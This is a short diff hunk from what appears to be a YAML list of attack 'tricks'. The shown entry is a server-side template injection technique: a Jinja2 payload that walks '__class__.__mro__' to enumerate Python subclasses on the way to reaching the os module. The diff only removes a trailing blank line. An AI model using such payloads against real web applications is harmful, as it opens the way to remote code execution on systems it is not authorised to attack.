@@ -40,4 +40,3 @@ tricks:
     how: "Chain through __class__.__mro__ to access os module"
     payload: |
       {{''.__class__.__mro__[1].__subclasses__()}}
-
